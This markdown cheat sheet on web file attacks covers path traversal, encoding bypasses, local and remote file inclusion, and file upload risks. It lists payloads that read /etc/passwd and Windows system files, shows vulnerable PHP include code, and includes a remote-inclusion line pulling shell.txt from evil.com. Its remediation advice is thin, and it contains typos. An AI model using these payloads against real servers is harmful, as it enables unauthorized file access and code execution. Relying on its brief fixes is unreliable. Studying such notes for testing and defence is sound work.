
# file and resource attacks

## Path traversal

Some web applications need to access resources on the file system to implement the web application such as images and static text. They sometimes use parameters to define the resources.

When these parameters are user-controlled, not properly sanitized and are used to build the resource path on the file system, security issues may arise.

```
http://somesite.com/getFile?path=awesome.pdf
```

Testing for path traversal using `../`

relative path...

```
http://somesite.com/getFile?path=../../../etc/passwd
```
absolute path...
```
http://somesite.com/getFile?path=/etc/passwd
```
on windows try
```
http://somesite.com/getFile?path=../../../windwos/win.ini

http://somesite.com/getFile?path=../../../boot.ini
```

* \*NIX Systems use `/`
* Windows uses drive letter and backslash: `C:\`

A *NULL BYTE* can be used to terminate a sequence...
```
%00

../../etc/password%00
```
Note that this does not work with PHP version >= 5.3.4

## Encoding

Web applications may perform filtering on these operations so try different encodings.

```
Character    URL encoding   16-bit unicode
.             %2e            %u002e
/             %2f            %u2215
\             %5c            %u2216
```

The payloads will now look like this...

```
../
%2e%2e%2f     
%2e%2e/
..%2f
..%255c
```

## Remediation

* filter the `/` or `\`

## File Inclusion Vulnerabilities

Vintage LFI (Local File Inclusion), PerlCGI from the early 90s...

```
visit.pl?url=../../../../etc/passwd
```

## Typical vulnerable code 1

```
http://target.site/index.php?location=IT
```

Code

```
<?php
  include("loc/" . $_GET('location'));
?>
```

Exploit

```
index.php?location=../../../etc/passwd
```

## with a null byte

Code

```
<?php
include($_GET['location'] . "/template.tlp");
?>
```

Exploit

```
index.php?location=../../../etc/passwd%00
```

The null by will terminate the string early effectively omitting the `/template.tlp` from the string.

## Remote File Inclusion (RFI)

Works in exactly the same way but the file is pulled remotely...

```
vuln.php?page=http://evil.com/shell.txt
vuln.php?page=http://duckduckgo.com
```

The shell.txt might contain anything or...

```
<?php
phpinfo();
?>
```

RFI is possible because the `allow_url_include` directive is set to On within *php.ini*, its good practice to set it to Off.

## Unrestricted File Upload

* https://www.owasp.org/index.php/Unrestricted_File_Upload

This vulnerability is very dangerous and can affect web servers that do not enforce policies on the nature of the files uploaded...

* the maximum file size (DoS)
* the nature of the file (is it an image or PDF)
